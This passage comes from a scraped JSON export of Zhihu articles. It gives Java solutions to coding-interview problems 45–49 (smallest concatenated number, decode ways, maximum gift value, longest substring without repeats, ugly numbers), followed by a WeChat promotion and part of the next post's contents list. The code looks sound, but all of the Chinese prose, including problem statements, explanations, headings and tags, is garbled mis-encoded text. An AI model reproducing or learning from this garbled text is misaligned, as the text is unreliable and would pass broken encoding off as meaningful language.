noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>è¾“å…¥ä¸€ä¸ªæ­£æ•´æ•°æ•°ç»„ï¼ŒæŠŠæ•°ç»„é‡Œæ‰€æœ‰æ•°å­—æ‹¼æ¥èµ·æ¥æ’æˆä¸€ä¸ªæ•°ï¼Œæ‰“å°èƒ½æ‹¼æ¥å‡ºçš„æ‰€æœ‰æ•°å­—ä¸­æœ€å°çš„ä¸€ä¸ªã€‚ä¾‹å¦‚è¾“å…¥æ•°ç»„ {3ï¼Œ32ï¼Œ321}ï¼Œåˆ™æ‰“å°å‡ºè¿™ä¸‰ä¸ªæ•°å­—èƒ½æ’æˆçš„æœ€å°æ•°å­—ä¸º 321323ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><p>å¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ªæ’åºé—®é¢˜ï¼Œåœ¨æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸² S1 å’Œ S2 çš„å¤§å°æ—¶ï¼Œåº”è¯¥æ¯”è¾ƒçš„æ˜¯ S1+S2 å’Œ S2+S1 çš„å¤§å°ï¼Œå¦‚æœ S1+S2 &lt; S2+S1ï¼Œé‚£ä¹ˆåº”è¯¥æŠŠ S1 æ’åœ¨å‰é¢ï¼Œå¦åˆ™åº”è¯¥æŠŠ S2 æ’åœ¨å‰é¢ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">String</span> <span class=\"nf\">PrintMinNumber</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">numbers</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">numbers</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"n\">numbers</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"s\">&#34;&#34;</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">n</span> <span class=\"o\">=</span> <span class=\"n\">numbers</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span>\n    <span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">nums</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">String</span><span class=\"o\">[</span><span class=\"n\">n</span><span class=\"o\">];</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">n</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n        <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">numbers</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">+</span> <span class=\"s\">&#34;&#34;</span><span class=\"o\">;</span>\n    <span class=\"n\">Arrays</span><span class=\"o\">.</span><span class=\"na\">sort</span><span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"o\">(</span><span class=\"n\">s1</span><span class=\"o\">,</span> <span class=\"n\">s2</span><span class=\"o\">)</span> <span class=\"o\">-&gt;</span> <span class=\"o\">(</span><span class=\"n\">s1</span> <span class=\"o\">+</span> <span class=\"n\">s2</span><span class=\"o\">).</span><span class=\"na\">compareTo</span><span class=\"o\">(</span><span class=\"n\">s2</span> <span class=\"o\">+</span> <span class=\"n\">s1</span><span class=\"o\">));</span>\n    <span class=\"n\">String</span> <span class=\"n\">ret</span> <span class=\"o\">=</span> <span class=\"s\">&#34;&#34;</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">str</span> <span class=\"o\">:</span> <span class=\"n\">nums</span><span class=\"o\">)</span>\n        <span class=\"n\">ret</span> <span class=\"o\">+=</span> <span class=\"n\">str</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"n\">ret</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>46. æŠŠæ•°å­—ç¿»è¯‘æˆå­—ç¬¦ä¸²</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//leetcode.com/problems/decode-ways/description/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Leetcode</a></p><h2>é¢˜ç›®æè¿°</h2><p>ç»™å®šä¸€ä¸ªæ•°å­—ï¼ŒæŒ‰ç…§å¦‚ä¸‹è§„åˆ™ç¿»è¯‘æˆå­—ç¬¦ä¸²ï¼š1 ç¿»è¯‘æˆâ€œaâ€ï¼Œ2 ç¿»è¯‘æˆâ€œbâ€... 26 ç¿»è¯‘æˆâ€œzâ€ã€‚ä¸€ä¸ªæ•°å­—æœ‰å¤šç§ç¿»è¯‘å¯èƒ½ï¼Œä¾‹å¦‚ 12258 ä¸€å…±æœ‰ 5 ç§ï¼Œåˆ†åˆ«æ˜¯ abbehï¼Œlbehï¼Œavehï¼Œabyhï¼Œlyhã€‚å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥è®¡ç®—ä¸€ä¸ªæ•°å­—æœ‰å¤šå°‘ç§ä¸åŒçš„ç¿»è¯‘æ–¹æ³•ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">numDecodings</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">s</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">s</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">()</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">n</span> <span class=\"o\">=</span> <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">();</span>\n    <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">dp</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">n</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">];</span>\n    <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">0</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">1</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"na\">charAt</span><span class=\"o\">(</span><span class=\"n\">0</span><span class=\"o\">)</span> <span class=\"o\">==</span> <span class=\"sc\">&#39;0&#39;</span> <span class=\"o\">?</span> <span class=\"n\">0</span> <span class=\"o\">:</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">2</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;=</span> <span class=\"n\">n</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"kt\">int</span> <span class=\"n\">one</span> <span class=\"o\">=</span> <span class=\"n\">Integer</span><span class=\"o\">.</span><span class=\"na\">valueOf</span><span class=\"o\">(</span><span class=\"n\">s</span><span class=\"o\">.</span><span class=\"na\">substring</span><span class=\"o\">(</span><span class=\"n\">i</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">i</span><span class=\"o\">));</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">one</span> <span class=\"o\">!=</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n            <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">+=</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">];</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">s</span><span class=\"o\">.</span><span class=\"na\">charAt</span><span class=\"o\">(</span><span class=\"n\">i</span> <span class=\"o\">-</span> <span class=\"n\">2</span><span class=\"o\">)</span> <span class=\"o\">==</span> <span class=\"sc\">&#39;0&#39;</span><span class=\"o\">)</span>\n            <span class=\"k\">continue</span><span class=\"o\">;</span>\n        <span class=\"kt\">int</span> <span class=\"n\">two</span> <span class=\"o\">=</span> <span class=\"n\">Integer</span><span class=\"o\">.</span><span class=\"na\">valueOf</span><span class=\"o\">(</span><span class=\"n\">s</span><span class=\"o\">.</span><span class=\"na\">substring</span><span class=\"o\">(</span><span class=\"n\">i</span> <span class=\"o\">-</span> <span class=\"n\">2</span><span class=\"o\">,</span> <span class=\"n\">i</span><span class=\"o\">));</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">two</span> <span class=\"o\">&lt;=</span> <span class=\"n\">26</span><span class=\"o\">)</span>\n            <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">+=</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span> <span class=\"o\">-</span> <span class=\"n\">2</span><span class=\"o\">];</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">n</span><span class=\"o\">];</span>\n<span class=\"o\">}</span></code></pre></div><h2>47. ç¤¼ç‰©çš„æœ€å¤§ä»·å€¼</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/questionTerminal/72a99e28381a407991f2c96d8cb238ab\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>åœ¨ä¸€ä¸ª m*n çš„æ£‹ç›˜çš„æ¯ä¸€ä¸ªæ ¼éƒ½æ”¾æœ‰ä¸€ä¸ªç¤¼ç‰©ï¼Œæ¯ä¸ªç¤¼ç‰©éƒ½æœ‰ä¸€å®šä»·å€¼ï¼ˆå¤§äº 0ï¼‰ã€‚ä»å·¦ä¸Šè§’å¼€å§‹æ‹¿ç¤¼ç‰©ï¼Œæ¯æ¬¡å‘å³æˆ–å‘ä¸‹ç§»åŠ¨ä¸€æ ¼ï¼Œç›´åˆ°å³ä¸‹è§’ç»“æŸã€‚ç»™å®šä¸€ä¸ªæ£‹ç›˜ï¼Œæ±‚æ‹¿åˆ°ç¤¼ç‰©çš„æœ€å¤§ä»·å€¼ã€‚ä¾‹å¦‚ï¼Œå¯¹äºå¦‚ä¸‹æ£‹ç›˜</p><div class=\"highlight\"><pre><code class=\"language-text\">1    10   3    8\n12   2    9    6\n5    7    4    11\n3    7    16   5</code></pre></div><p>ç¤¼ç‰©çš„æœ€å¤§ä»·å€¼ä¸º 1+12+5+7+7+16+5=53ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><p>åº”è¯¥ç”¨åŠ¨æ€è§„åˆ’æ±‚è§£ï¼Œè€Œä¸æ˜¯æ·±åº¦ä¼˜å…ˆæœç´¢ï¼Œæ·±åº¦ä¼˜å…ˆæœç´¢è¿‡äºå¤æ‚ï¼Œä¸æ˜¯æœ€ä¼˜è§£ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">getMost</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[][]</span> <span class=\"n\">values</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">values</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"n\">values</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">==</span> <span class=\"n\">0</span> <span class=\"o\">||</span> <span class=\"n\">values</span><span class=\"o\">[</span><span class=\"n\">0</span><span class=\"o\">].</span><span class=\"na\">length</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">n</span> <span class=\"o\">=</span> <span class=\"n\">values</span><span class=\"o\">[</span><span class=\"n\">0</span><span class=\"o\">].</span><span class=\"na\">length</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">dp</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">n</span><span class=\"o\">];</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">value</span> <span class=\"o\">:</span> <span class=\"n\">values</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">0</span><span class=\"o\">]</span> <span class=\"o\">+=</span> <span class=\"n\">value</span><span class=\"o\">[</span><span class=\"n\">0</span><span class=\"o\">];</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">n</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n            <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">max</span><span class=\"o\">(</span><span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">],</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">])</span> <span class=\"o\">+</span> <span class=\"n\">value</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">];</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">n</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">];</span>\n<span class=\"o\">}</span></code></pre></div><h2>48. æœ€é•¿ä¸å«é‡å¤å­—ç¬¦çš„å­å­—ç¬¦ä¸²</h2><h2>é¢˜ç›®æè¿°</h2><p>è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆåªåŒ…å« a\\~z çš„å­—ç¬¦ï¼‰ï¼Œæ±‚å…¶æœ€é•¿ä¸å«é‡å¤å­—ç¬¦çš„å­å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚ä¾‹å¦‚å¯¹äº arabcacfrï¼Œæœ€é•¿ä¸å«é‡å¤å­—ç¬¦çš„å­å­—ç¬¦ä¸²ä¸º acfrï¼Œé•¿åº¦ä¸º 4ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">longestSubStringWithoutDuplication</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">str</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">curLen</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">maxLen</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">preIndexs</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">26</span><span class=\"o\">];</span>\n    <span class=\"n\">Arrays</span><span class=\"o\">.</span><span class=\"na\">fill</span><span class=\"o\">(</span><span class=\"n\">preIndexs</span><span class=\"o\">,</span> <span class=\"o\">-</span><span class=\"n\">1</span><span class=\"o\">);</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">curI</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">curI</span> <span class=\"o\">&lt;</span> <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">();</span> <span class=\"n\">curI</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"kt\">int</span> <span class=\"n\">c</span> <span class=\"o\">=</span> <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">charAt</span><span class=\"o\">(</span><span class=\"n\">curI</span><span class=\"o\">)</span> <span class=\"o\">-</span> <span class=\"sc\">&#39;a&#39;</span><span class=\"o\">;</span>\n        <span class=\"kt\">int</span> <span class=\"n\">preI</span> <span class=\"o\">=</span> <span class=\"n\">preIndexs</span><span class=\"o\">[</span><span class=\"n\">c</span><span class=\"o\">];</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">preI</span> <span class=\"o\">==</span> <span class=\"o\">-</span><span class=\"n\">1</span> <span class=\"o\">||</span> <span class=\"n\">curI</span> <span class=\"o\">-</span> <span class=\"n\">preI</span> <span class=\"o\">&gt;</span> <span class=\"n\">curLen</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">curLen</span><span class=\"o\">++;</span>\n        <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>\n            <span class=\"n\">maxLen</span> <span class=\"o\">=</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">max</span><span class=\"o\">(</span><span class=\"n\">maxLen</span><span class=\"o\">,</span> <span class=\"n\">curLen</span><span class=\"o\">);</span>\n            <span class=\"n\">curLen</span> <span class=\"o\">=</span> <span class=\"n\">curI</span> <span class=\"o\">-</span> <span class=\"n\">preI</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n        <span class=\"n\">preIndexs</span><span class=\"o\">[</span><span class=\"n\">c</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">curI</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"n\">maxLen</span> <span class=\"o\">=</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">max</span><span class=\"o\">(</span><span class=\"n\">maxLen</span><span class=\"o\">,</span> <span class=\"n\">curLen</span><span class=\"o\">);</span>\n    <span class=\"k\">return</span> <span class=\"n\">maxLen</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>49. ä¸‘æ•°</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/6aa9e04fc3794f68acf8778237ba065b%3FtpId%3D13%26tqId%3D11186%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>æŠŠåªåŒ…å«å› å­ 2ã€3 å’Œ 5 çš„æ•°ç§°ä½œä¸‘æ•°ï¼ˆUgly Numberï¼‰ã€‚ä¾‹å¦‚ 6ã€8 éƒ½æ˜¯ä¸‘æ•°ï¼Œä½† 14 ä¸æ˜¯ï¼Œå› ä¸ºå®ƒåŒ…å«å› å­ 7ã€‚ä¹ æƒ¯ä¸Šæˆ‘ä»¬æŠŠ 1 å½“åšæ˜¯ç¬¬ä¸€ä¸ªä¸‘æ•°ã€‚æ±‚æŒ‰ä»å°åˆ°å¤§çš„é¡ºåºçš„ç¬¬ N ä¸ªä¸‘æ•°ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">GetUglyNumber_Solution</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">N</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">N</span> <span class=\"o\">&lt;=</span> <span class=\"n\">6</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">N</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">i2</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">i3</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">i5</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">dp</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">N</span><span class=\"o\">];</span>\n    <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">0</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">N</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"kt\">int</span> <span class=\"n\">next2</span> <span class=\"o\">=</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i2</span><span class=\"o\">]</span> <span class=\"o\">*</span> <span class=\"n\">2</span><span class=\"o\">,</span> <span class=\"n\">next3</span> <span class=\"o\">=</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i3</span><span class=\"o\">]</span> <span class=\"o\">*</span> <span class=\"n\">3</span><span class=\"o\">,</span> <span class=\"n\">next5</span> <span class=\"o\">=</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i5</span><span class=\"o\">]</span> <span class=\"o\">*</span> <span class=\"n\">5</span><span class=\"o\">;</span>\n        <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">min</span><span class=\"o\">(</span><span class=\"n\">next2</span><span class=\"o\">,</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">min</span><span class=\"o\">(</span><span class=\"n\">next3</span><span class=\"o\">,</span> <span class=\"n\">next5</span><span class=\"o\">));</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">==</span> <span class=\"n\">next2</span><span class=\"o\">)</span>\n            <span class=\"n\">i2</span><span class=\"o\">++;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">==</span> <span class=\"n\">next3</span><span class=\"o\">)</span>\n            <span class=\"n\">i3</span><span class=\"o\">++;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">==</span> <span class=\"n\">next5</span><span class=\"o\">)</span>\n            <span class=\"n\">i5</span><span class=\"o\">++;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">N</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">];</span>\n<span class=\"o\">}</span></code></pre></div><h2>å¾®ä¿¡å…¬ä¼—å·</h2><p>ä½ å¯ä»¥åœ¨æˆ‘çš„å¾®ä¿¡å…¬ä¼—å·åå°ä¸æˆ‘äº¤æµã€‚å¦å¤–ï¼Œå…¬ä¼—å·ä¹Ÿæä¾›äº†ä¸€ä»½æŠ€æœ¯é¢è¯•å¤ä¹ å¤§çº²ï¼Œä¸ä»…ç³»ç»Ÿæ•´ç†äº†é¢è¯•çŸ¥è¯†ç‚¹ï¼Œè€Œä¸”æ ‡æ³¨äº†å„ä¸ªçŸ¥è¯†ç‚¹çš„é‡è¦ç¨‹åº¦ï¼Œä»è€Œå¸®ä½ ç†æ¸…å¤šè€Œæ‚çš„é¢è¯•çŸ¥è¯†ç‚¹ï¼Œåå°å›å¤ &#34;å¤§çº²&#34; å³å¯é¢†å–ã€‚æˆ‘åŸºæœ¬æ˜¯æŒ‰ç…§è¿™ä¸ªå¤§çº²æ¥è¿›è¡Œå¤ä¹ çš„ï¼Œå¯¹æˆ‘æ‹¿åˆ°äº† BAT å¤´æ¡ç­‰ Offer èµ·åˆ°å¾ˆå¤§çš„å¸®åŠ©ã€‚ä½ ä»¬å®Œå…¨å¯ä»¥å’Œæˆ‘ä¸€æ ·æ ¹æ®å¤§çº²ä¸Šåˆ—çš„çŸ¥è¯†ç‚¹æ¥è¿›è¡Œå¤ä¹ ï¼Œå°±ä¸ç”¨çœ‹å¾ˆå¤šä¸é‡è¦çš„å†…å®¹ï¼Œä¹Ÿå¯ä»¥çŸ¥é“å“ªäº›å†…å®¹å¾ˆé‡è¦ä»è€Œå¤šå®‰æ’ä¸€äº›å¤ä¹ æ—¶é—´ã€‚å…¬ä¼—å·ä¹Ÿæä¾›äº†è¯¥é¡¹ç›®çš„ç¦»çº¿é˜…è¯»ç‰ˆæœ¬ï¼Œåå°å›å¤ &#34;ä¸‹è½½&#34; å³å¯é¢†å–ã€‚</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;937&#39; height=&#39;354&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }, 
                {
                    "tag": "ç®—æ³•", 
                    "tagLink": "https://api.zhihu.com/topics/19553510"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/68764988", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 0, 
            "title": "å‰‘æŒ‡ Offer é¢˜è§£ 30-39", 
            "content": "<ul><li><a href=\"https://zhuanlan.zhihu.com/p/68764988/edit#30-%E5%8C%85%E5%90%AB-min-%E5%87%BD%E6%95%B0%E7%9A%84%E6%A0%88\" class=\"internal\">30. åŒ…å« min å‡½æ•°çš„æ ˆ</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764988/edit#31-%E6%A0%88%E7%9A%84%E5%8E%8B%E5%85%A5%E5%BC%B9%E5%87%BA%E5%BA%8F%E5%88%97\" class=\"internal\">31. æ ˆçš„å‹å…¥ã€å¼¹å‡ºåºåˆ—</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764988/edit#321-%E4%BB%8E%E4%B8%8A%E5%BE%80%E4%B8%8B%E6%89%93%E5%8D%B0%E4%BA%8C%E5%8F%89%E6%A0%91\" class=\"internal\">32.1 ä»ä¸Šå¾€ä¸‹æ‰“å°äºŒå‰æ ‘</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764988/edit#322-%E6%8A%8A%E4%BA%8C%E5%8F%89%E6%A0%91%E6%89%93%E5%8D%B0%E6%88%90%E5%A4%9A%E8%A1%8C\" class=\"internal\">32.2 æŠŠäºŒå‰æ ‘æ‰“å°æˆå¤šè¡Œ</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764988/edit#323-%E6%8C%89%E4%B9%8B%E5%AD%97%E5%BD%A2%E9%A1%BA%E5%BA%8F%E6%89%93%E5%8D%B0%E4%BA%8C%E5%8F%89%E6%A0%91\" class=\"internal\">32.3 æŒ‰ä¹‹å­—å½¢é¡ºåºæ‰“å°äºŒå‰æ ‘</a></li><li><a 